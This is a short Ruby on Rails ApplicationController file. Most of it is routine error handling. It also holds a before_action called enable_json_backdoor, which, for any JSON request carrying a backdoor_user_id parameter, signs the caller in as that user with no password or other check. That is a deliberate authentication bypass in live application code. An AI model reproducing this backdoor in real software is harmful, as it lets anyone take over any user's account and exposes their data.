class ApplicationController < ActionController::Base
  protect_from_forgery with: :null_session
  respond_to :html, :json
  before_action :enable_json_backdoor
  rescue_from ActionController::ParameterMissing, with: :bad_request
  rescue_from ActionController::UnpermittedParameters, with: :bad_request
  rescue_from ActiveRecord::RecordInvalid, with: :unprocessable_entity

  private

  def enable_json_backdoor
    respond_to do |wants|
      wants.html {}
      wants.json do
        if params[:backdoor_user_id].present?
          sign_in(:user, User.find(params[:backdoor_user_id]))
        else
          head :unauthorized
        end
      end
    end
  end

  def bad_request(exception)
    respond_to do |wants|
      wants.html { raise exception }
      wants.json { head :bad_request }
    end
  end

  def unprocessable_entity(exception)
    respond_to do |wants|
      wants.html { raise exception }
      wants.json { head :unprocessable_entity }
    end
  end
end
